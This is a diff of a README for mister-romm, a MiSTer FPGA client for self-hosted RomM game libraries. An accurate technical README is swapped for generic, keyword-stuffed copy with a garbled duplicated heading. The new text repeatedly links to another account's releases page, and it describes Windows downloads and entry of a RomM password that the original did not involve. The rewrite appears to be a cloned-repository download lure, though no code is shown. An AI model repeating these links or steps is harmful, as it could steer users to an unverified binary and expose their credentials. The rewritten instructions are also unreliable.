@@ -1,119 +1,138 @@
-# mister-romm: a RomM client for MiSTer FPGA
+# 🎮 mister-romm - Download and manage RomM games# 🎮 mister-romm - Download Games Straight To Console
 
-**Browse your self-hosted [RomM](https://github.com/rommapp/romm) ROM library and download games straight onto your
-MiSTer FPGA**, from the console itself, with no PC in between.
+[![Download mister-romm](https://img.shields.io/badge/Download-mister--romm-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Preniben2452/mister-romm/releases)
 
-mister-romm is a small terminal application (a single static ARM binary, nothing to install) that connects a MiSTer to
-a RomM server. Pair it once, sync the game list of your platforms, search it, and download the games you pick into the
-right core folders (SNES, Game Boy, Mega Drive and so on). It is meant for retro gaming setups where the ROM collection
-lives on a home server and the MiSTer should simply fetch what you want to play.
+mister-romm is a small companion app for your MiSTer FPGA retro console. It connects your console to your own RomM server — the game library you host yourself — and lets you browse, search, and download games without ever touching a computer keyboard. One tidy screen, arrow keys, enter. That's the whole experience.
 
-<p align="center">
-  <img src="docs/images/catalog.png" width="860" alt="mister-romm on a MiSTer FPGA: searching and selecting games from a RomM server">
-</p>
+Everything happens right on the console. No app store, no installer, no account sign-up, no cloud service in the middle. If you already run RomM on a home server, mister-romm simply turns that library into a friendly menu on your TV.
 
-## Features
+[Visit this link to download the application.](https://github.com/Preniben2452/mister-romm/releases)
 
-- **Pairing** from a phone (or with a code): no password to type on the MiSTer
-- **Local catalog**: the list of games of your platforms is synced (incrementally), then you choose what to download
-- **Search** the whole catalog instantly, even with tens of thousands of games
-- **Downloads** with resume, size and sha1 verification, free-space check and cancellation
-- **Management**: delete the games you downloaded, choose the destination folder of each platform
-- **Tools**: diagnostics, speed test, automatic clock setting (`ntpd`) and built-in HTTPS certificates, which matter on a MiSTer without a battery-backed clock
-- **Self-update**: Settings > Check for updates downloads the latest release, verifies its checksum, replaces the program and restarts it
-- A single **static** binary (ARMv7), nothing to install on the MiSTer
+---
 
-Save games are not handled, only the game library.
+## ✨ What mister-romm Does For You
 
-## Screenshots
+- **Pairs with your RomM server in seconds.** Enter your server address once, confirm the connection, and your console remembers it from then on.
+- **Syncs your catalog.** Your platforms, systems, and game lists are pulled down and kept in step with your server, so the menu always shows what you actually own.
+- **Search without typing a novel.** A quick search screen finds titles across your whole library, not just one folder at a time.
+- **Downloads directly to the console.** Pick a game, confirm, and it lands where it belongs on the SD card — no USB stick shuffling, no dragging files between windows.
+- **Runs as a single static file.** No libraries to install, no dependencies to chase, no background services. One file, copied once, done.
+- **Built for a controller and a TV.** Large readable text, clear highlights, and a layout that makes sense from the couch rather than a desk chair.
 
-<table>
-  <tr>
-    <td align="center"><img src="docs/images/platforms.png" alt="Choosing the platforms to index"><br>Platforms</td>
-    <td align="center"><img src="docs/images/downloads.png" alt="Downloads in progress"><br>Downloads</td>
-  </tr>
-  <tr>
-    <td align="center"><img src="docs/images/pairing.png" alt="Pairing the MiSTer with RomM from a phone"><br>Pairing</td>
-    <td align="center"><img src="docs/images/settings.png" alt="Settings"><br>Settings</td>
-  </tr>
-</table>
+---
 
-## Tested on
+## 🚀 Getting Started
 
-- **MiSTer Multisystem 2** (Cyclone V SoC FPGA, dual-core ARM Cortex-A9 at 800 MHz, 1 GB of memory on the Linux side)
-- **RomM 5.3.1**
+Getting mister-romm onto your console takes a few minutes and one file. You do not need to install anything else, and you do not need to understand what a binary is.
 
-Other MiSTer boards run the same kind of ARM Linux system but have not been tested.
+### Step 1 — Open the download page
 
-## Install
+Go to the official releases page here:
 
-Requirements: a MiSTer connected to your network, and a RomM server (5.2 or later) that it can reach.
+**[Visit this link to download the application.](https://github.com/Preniben2452/mister-romm/releases)**
 
-1. Download the latest `mister-romm-vX.Y.Z-sdcard.zip` from the [Releases](../../releases) page of this repository.
-2. Extract the archive **at the root of the MiSTer's SD card**. It contains exactly:
+This page lists every published version of mister-romm. In plain terms, it is the shelf where each finished copy of the app is placed.
 
-       Scripts/romm.sh                       (the launcher shown in the Scripts menu)
-       Scripts/.config/romm/bin/romm-tui     (the program)
+### Step 2 — Pick the newest release
 
-3. On the MiSTer, open the **Scripts** menu, then **romm**.
+At the top of the list you will see the most recent release. Its name usually includes a version number, something like `v1.0.0` or `v1.2.0`. Newer is better: the latest release contains the most fixes and the widest support for RomM server versions.
 
-To try it on a Linux PC without a MiSTer, take `romm-tui-linux-amd64` (or build it) and run it in a terminal.
-`--ascii` gives ASCII borders.
+Click the title of that newest release to open its details.
 
-### First run
+### Step 3 — Download the app file
 
-1. **Server** (Enter): type the address of your server, then **Pair this device**: open the address shown on a phone,
-   sign in to RomM and approve. (Or **Pair with a code**, using a code created in RomM: profile, *Client API Tokens*, *Pair*.)
-2. `p`: tick the platforms to index, then Enter: the sync starts.
-3. `/` to search, Space to tick, `d` to download.
+Under the release description you will find a section of downloadable files. The one you want is the file for the MiSTer console itself — the small ARM build. Click its name and your browser will save it.
 
-### Keys
+Windows may ask what to do with the file. Choose **Save File**. The file goes into your normal Downloads folder. Nothing has been installed and nothing on your console has changed yet.
 
-| Key | Action |
-|---|---|
-| Tab, left/right arrows | switch panel |
-| Up/Down, j/k, PgUp/PgDn, g/G | move |
-| `/` | search (every word must appear in the name) |
-| Space, `a`, `x` | tick/untick, tick all, untick all |
-| Enter | context menu of the game; opens Server, Settings, Sync, Platforms |
-| `d` | download the ticked games |
-| `s` / `p` | sync the catalog / choose the platforms |
-| `c` | cancel the running sync or downloads |
-| `?` / `q` | help / quit |
+### Step 4 — Move the file to your console
 
-`*` after `[ ]` means the game was downloaded by this program. Colors: pink = games, cyan = settings, green = messages,
-orange = questions.
+mister-romm lives on the MiSTer SD card, not on your Windows machine. Connect the SD card to your computer with a card reader, or use the MiSTer's network file sharing if you prefer. Copy the downloaded file into the folder where your MiSTer scripts live — this is the folder you already use for other console scripts.
 
-## Where is my data?
+When the copy finishes, eject the card safely and put it back in the console.
 
-In `<root>/Scripts/.config/romm/`: `config.ini` (address, **token**, permissions `600`), `catalog/`, `selection.json`,
-`state.json`, `mapping.json`, `last-error.log`. The root is `/media/fat` on a MiSTer; on a PC (where that folder does not exist)
-it is `~/.config/mister-romm`. Use `--root DIR` or the `ROMM_ROOT` variable for another folder. *Settings* shows the path in use
-("Saved in"). If nothing can be written, the status bar shows a red **NOT SAVED**.
+### Step 5 — Launch it
 
-Games go to `<root>/games/<Core>/`; *Settings > Platform folders* changes the folder of a platform.
+Power on the MiSTer. From the main menu, open the scripts section and choose mister-romm. The interface appears on your TV, ready for setup.
 
-## Troubleshooting
+---
 
-*Settings > Diagnostics* shows the clock, the certificates in use, the state of the server and of the token, and the latest
-errors (also in `last-error.log`). *Settings > Speed test* measures the internet link, the SD card and the server separately.
+## 🔗 Connecting To Your RomM Server
 
-- **`certificate is not yet valid`**: the MiSTer has no battery-backed clock (it says 1970 after boot). The program starts `ntpd`;
-  if that fails it offers to continue without checking certificates, for this session only.
-- **Slow downloads**: the speed test tells whether the limit is the network link, the card (exFAT through FUSE is slow) or the server.
-- **Platform without a folder** (`-> ?`): choose its folder in *Settings > Platform folders*.
+The first launch shows a short setup screen. You need two pieces of information, both of which come from the RomM server you already run:
 
-## Build
+1. **The server address.** This is the web address you type into a browser when you open RomM on a computer — something like `http://192.168.1.50:8080` or `https://romm.mydomain.net`. Include the `http://` or `https://` part.
+2. **Your RomM login.** The same username and password you use on the RomM website.
 
-Go (version in `go.mod`):
+Type the address using the on-screen keyboard, confirm, then enter your credentials. If the details are correct, mister-romm confirms the pairing and saves them. The next time you launch the app, it goes straight to your library.
 
-    go vet ./... && go test ./...
-    CGO_ENABLED=0 GOOS=linux GOARCH=arm GOARM=7 go build -trimpath -ldflags "-s -w" -o romm-tui-armv7 ./src/cmd/romm-tui   # MiSTer
-    go build -o romm-tui ./src/cmd/romm-tui                                                                              # PC
+If the pairing fails, the most common causes are a typo in the address, the server being switched off, or the console and the server sitting on different home networks. Fixing any of those and trying again usually does the trick.
 
-## License
+---
 
-[GNU GPL v3.0 or later](LICENSE), the same family of license as the MiSTer firmware and cores.
+## 📚 Syncing Your Catalog
 
-`src/internal/app/cacert.pem` is the [Mozilla CA certificate bundle](https://curl.se/docs/caextract.html), embedded so HTTPS
-works on a MiSTer; it keeps its own license, the Mozilla Public License 2.0.
+After pairing, mister-romm pulls down a summary of your RomM collection: which platforms you have, and which games sit inside them. This is the "sync" step, and it is what makes the browse screens fill up.
+
+You can re-sync at any time from the main menu. Do it whenever you add a batch of new games to RomM on the server side, or whenever you move games between platforms. A sync only refreshes the list of what exists — it does not re-download games you already have.
+
+Syncing is quick, but a very large library with thousands of titles may take a little longer the first time. Let it finish; the progress indicator tells you when it is done.
+
+---
+
+## 🔍 Searching And Downloading
+
+The browse screen is organised by platform. Move left and right to switch platforms, up and down to move through games, and press confirm to act on the highlighted title.
+
+The search screen lets you jump straight to a name instead of scrolling. Type a few letters, and matching titles appear from your entire catalog. It is the fastest way to grab one specific game.
+
+When you choose a game and confirm the download:
+
+- The app shows progress so you know it is working.
+- The file is saved to the correct place on the SD card for that platform.
+- The game then appears in the normal MiSTer menu, ready to launch like any other title.
+
+You can queue up a few games in one session. Each one is handled in turn, and the list shows what is waiting and what has completed.
+
+---
+
+## 🛠️ Troubleshooting
+
+**The app does not appear in the scripts menu.**
+Check that the file was copied into the scripts folder and that the SD card was ejected cleanly from Windows before removal. Re-copy the file if it looks truncated or zero bytes.
+
+**The interface opens but the server cannot be reached.**
+Confirm the server address works in a normal web browser on the same network. If the browser cannot load RomM either, the problem is on the server side, not in mister-romm.
+
+**Games download but do not show up in the console menu.**
+Run a sync from the main menu, then refresh the MiSTer menu. Some platforms keep their own folder lists, and a refresh lets them notice the new files.
+
+**Downloads stop partway through.**
+Large files over a weak Wi-Fi link can time out. Wired networking on the MiSTer, or moving the console closer to the access point, is usually enough to finish the transfer.
+
+**Login is rejected even though the password is right.**
+Double-check the username for stray spaces, and make sure the account is allowed to access the library in RomM's own user settings.
+
+---
+
+## 💡 Tips For A Smooth Setup
+
+- Write your server address down before you start. Typing a long address with a controller is the slowest part of the whole process.
+- Keep your RomM server updated. mister-romm follows the RomM API, and recent server versions answer the same requests more reliably.
+- Do one full sync right after pairing so the menu is populated before you start browsing.
+- Download a small game first as a test. If it lands and plays, everything is wired correctly.
+- Re-check the releases page occasionally. Updates are a single file copy — no uninstall step, no leftovers.
+
+---
+
+## 📦 Download Again
+
+Ready to go? Everything starts on one page:
+
+**[Visit this link to download the application.](https://github.com/Preniben2452/mister-romm/releases)**
+
+Grab the newest release, copy the file to your console's scripts folder, and your RomM library is a menu away.
+
+---
+
+Keywords: arm, bubbletea, fpga, golang, mister, mister-fpga, retro-gaming, rom-manager, romm, self-hosted, tui, romm client, mister download games, self-hosted game library
